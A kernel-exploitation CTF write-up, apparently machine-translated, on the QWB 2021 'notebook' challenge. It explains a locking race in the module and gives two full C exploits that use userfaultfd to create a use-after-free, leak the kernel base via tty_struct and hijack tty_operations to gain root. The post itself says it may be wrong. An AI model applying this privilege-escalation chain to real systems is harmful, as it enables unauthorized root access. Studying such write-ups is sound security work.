---
title: 「Kernel Pwn」从强网杯 2021 notebook 理解 RaceCondition 做法
description: 我是 Kernel Pwn 新手
pubDate: 2024-10-31
authors:
- nova

---
I am new to Kernel Pwn.

The related GitHub repository can be found by searching for `qwb2021` on GitHub.

{/* truncate */}

## Analysis

### noteadd

![image-20241031142916722](https://oss.nova.gal/img/image-20241031142916722.png)

There is a very peculiar logic here: after obtaining the `size`, it first sets `notebook[idx].size`, and only if it is invalid does it revert it. It’s not hard to see that if some code relies on this `size` for further logic, there exists a race window where an invalid `size` could be changed to a valid one.

One might argue: isn’t this protected by a lock? Indeed. But who would take a read lock inside the write operation? As long as no write lock is held, multiple threads holding a read lock can access this critical region concurrently.

### notedel

![image-20241031143209266](https://oss.nova.gal/img/image-20241031143209266.png)

The logic here is also strange. It only clears `v3->note` if the `size` field exists. Therefore, if during deletion the `note` size is `0`, it won’t be cleared. However, it holds a write lock, so there’s no direct UAF with `add`.

### noteedit

![image-20241031143856161](https://oss.nova.gal/img/image-20241031143856161.png)

For `edit`, it also takes a read lock and calls `krealloc`. If `v5->size` is `0`, it will clear the `note` field. It’s important to note that there is no restriction on the new `size` here.

If one of our threads calls `krealloc(0)` and then gets stuck at `copy_from_user`, we effectively create a UAF. But since it still needs to check the `size` field afterward, we must restore it to proceed. If we continue with `edit`, we cannot stall at `copy_from_user` again because the allocation has already been done.

If we try to stall another `realloc` with the original size, the race window is too small: we must ensure `size = v5->size` remains the original size at that moment, and by the time `if (size == newsize)` is checked, our other thread must have completed `realloc(0)` and be waiting at `copy_from_user`.

Therefore, we can use `noteadd` instead, because it first changes the size and then performs `copy_from_user`. At this point, we can control the race window: we stall at the `krealloc(0)` `copy_from_user`, trigger `add` to change the size, and then resume to continue the exploit reliably.

### notegift

![image-20241031144057570](C:\Users\nova\AppData\Roaming\Typora\typora-user-images\image-20241031144057570.png)

It directly gives us the `notebook`, including heap addresses and more.

### mynote_read

![image-20241031144311861](https://oss.nova.gal/img/image-20241031144311861.png)

Read operation is not locked.

### mynote_write

![image-20241031144354846](https://oss.nova.gal/img/image-20241031144354846.png)

Write operation is also not locked.

## Approach

### 1. userfaultfd + tty_struct

Using `userfaultfd` makes it easiest to trigger a UAF, as we can map the user buffer page to an anonymous region that causes a page fault on access, redirecting control to our handler.

Thus, we use `tty_struct` to leak kernel addresses and forge `tty_operations` for privilege escalation. During the `write` syscall, the `rax` register holds the `tty_struct` pointer, so we can place our ROP chain there and pivot the stack to our `notebook`, achieving full kernel code execution.

To orchestrate our race, we use semaphores.

1. Add a chunk, then `edit` it to size `0`, causing `copy_from_user` to page-fault and enter our handler.
2. In the handler, we signal `add` to change the size, then re-trigger the fault to continue the exploit.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <semaphore.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/syscall.h>

#define DEBUG 1
#include "kernel.h"

sem_t add_sem, edit_sem;

struct Note {
    size_t idx;
    size_t size;
    void *content;
};

struct KNote {
    void* ptr;
    size_t size;
};

struct KNote notes[0x10];

pthread_t monitor_thread, add_thread, edit_thread;
char *uffd_buf;

int fd;

void add(int idx, int size, char *content) {
    struct Note note;
    note.idx = idx;
    note.size = size;
    note.content = content;

    ioctl(fd, 0x100, &note);
}

void delete(int idx) {
    struct Note note;
    note.idx = idx;
    ioctl(fd, 0x200, &note);
}

void edit(int idx, int size, char *content) {
    struct Note note;
    note.idx = idx;
    note.size = size;
    note.content = content;

    ioctl(fd, 0x300, &note);
}

void gift(void *buf) {
    struct Note note = {
        .content = buf
    };
    ioctl(fd, 100, &note);
}

void note_read(int idx, void *buf) {
    read(fd, buf, idx);
}

void note_write(int idx, void *buf) {
    write(fd, buf, idx);
}

void stuck() {
    puts("[+] Stuck");
    sleep(100000);
}

void add_thread_func() {
    sem_wait(&add_sem);
    add(0, 0x20, uffd_buf);
}

void edit_thread_func() {
    sem_wait(&edit_sem);
    edit(0, 0, uffd_buf);
}

int main() {
    int tty_fd;
    size_t tty_buf[0x100];
    save_status();
    bind_cpu(0);


    fd = open("/dev/notebook", O_RDWR);
    if (fd < 0) {
        perror("open fd");
        exit(EXIT_FAILURE);
    }
    sem_init(&add_sem, 0, 0);
    sem_init(&edit_sem, 0, 0);

    uffd_buf = (char *) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd_with_default_handler(&monitor_thread, uffd_buf, 0x1000, stuck);

    add(0, 0x20, "add");
    edit(0, 0x2e0, "tty");

    pthread_create(&add_thread, NULL, (void *)add_thread_func, NULL);
    pthread_create(&edit_thread, NULL, (void *)edit_thread_func, NULL);

    sem_post(&edit_sem);
    sleep(1);
    sem_post(&add_sem);
    sleep(1);

    puts("[+] UAF");  // 0->ptr = freed_chunk

    tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    note_read(0, tty_buf);
    kernel_base = tty_buf[3] - 0xe8e440;
    printf("[+] kernel_base = 0x%lx\n", kernel_base);
}
```

In this setup, we use two semaphores to coordinate. For pages that trigger faults, `stuck` suffices. Once we have a UAF, we simply use `write` for the privilege escalation.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <semaphore.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/syscall.h>

#define DEBUG 1
#include "kernel.h"

size_t WORK_FOR_CPU_FN = 0xffffffff8109eb90;
size_t PREPARE_KERNEL_CRED = 0xffffffff810a9ef0;
size_t COMMIT_CREDS = 0xffffffff810a9b40;

char tmp_buf[0x1000];

sem_t add_sem, edit_sem;

struct Note {
    size_t idx;
    size_t size;
    void *content;
};

struct KNote {
    void* ptr;
    size_t size;
};

struct KNote notes[0x10];

pthread_t monitor_thread, add_thread, edit_thread;
char *uffd_buf;

int fd;

void add(int idx, int size, char *content) {
    struct Note note;
    note.idx = idx;
    note.size = size;
    note.content = content;

    ioctl(fd, 0x100, &note);
}

void delete(int idx) {
    struct Note note;
    note.idx = idx;
    ioctl(fd, 0x200, &note);
}

void edit(int idx, int size, char *content) {
    struct Note note;
    note.idx = idx;
    note.size = size;
    note.content = content;

    ioctl(fd, 0x300, &note);
}

void gift(void *buf) {
    struct Note note = {
        .content = buf
    };
    ioctl(fd, 100, &note);
}

void note_read(int idx, void *buf) {
    read(fd, buf, idx);
}

void note_write(int idx, void *buf) {
    write(fd, buf, idx);
}

void stuck() {
    puts("[+] Stuck");  // stuck to prevent copy_from_user
    sleep(100000);
}

void add_thread_func() {
    sem_wait(&add_sem);
    add(0, 0x60, uffd_buf);
}

void edit_thread_func() {
    sem_wait(&edit_sem);
    edit(0, 0, uffd_buf);
}

int main() {
    int tty_fd;
    size_t tty_buf[0x2e0], orig_tty_buf[0x2e0];
    struct tty_operations fake_tty_ops;
    save_status();
    bind_cpu(0);

    fd = open("/dev/notebook", O_RDWR);
    if (fd < 0) {
        perror("open fd");
        exit(EXIT_FAILURE);
    }
    sem_init(&add_sem, 0, 0);
    sem_init(&edit_sem, 0, 0);

    uffd_buf = (char *) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd_with_default_handler(&monitor_thread, uffd_buf, 0x1000, stuck);

    add(0, 0x20, "add");
    edit(0, 0x2e0, "tty");

    pthread_create(&add_thread, NULL, (void *)add_thread_func, NULL);
    pthread_create(&edit_thread, NULL, (void *)edit_thread_func, NULL);

    sem_post(&edit_sem);
    sleep(1);
    sem_post(&add_sem);
    sleep(1);

    puts("[+] UAF");  // 0->ptr = freed_chunk

    tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    note_read(0, tty_buf);
    memcpy(orig_tty_buf, tty_buf, sizeof(tty_buf));
    kernel_offset = tty_buf[3] - 0xe8e440 - kernel_base;
    kernel_base = kernel_base + kernel_offset;
    printf("[+] kernel_base = 0x%lx\n", kernel_base);

    // fake tty_struct
    add(1, 0x20, "fake tty ops");
    edit(1, sizeof(struct tty_operations), "fake tty ops");

    fake_tty_ops.ioctl = (void *)kernel_offset + WORK_FOR_CPU_FN;
    note_write(1, &fake_tty_ops);

    gift(notes);
    printf("[+] tty_struct = %p\n", notes[0].ptr);
    printf("[+] tty_operations = %p\n", notes[1].ptr);

    tty_buf[4] = kernel_offset + PREPARE_KERNEL_CRED;
    tty_buf[5] = 0;
    tty_buf[3] = (size_t)notes[1].ptr;
    note_write(0, tty_buf);

    ioctl(tty_fd, 1, 1);

    note_read(0, tty_buf);
    tty_buf[4] = kernel_offset + COMMIT_CREDS;
    tty_buf[5] = tty_buf[6];

    note_write(0, tty_buf);
    ioctl(tty_fd, 1, 1);

    note_write(0, orig_tty_buf);

    get_root_shell();
}
```

:::info
This Content is generated by LLM and might be wrong / incomplete, refer to Chinese version if you find something wrong.
:::

{/* AI */}
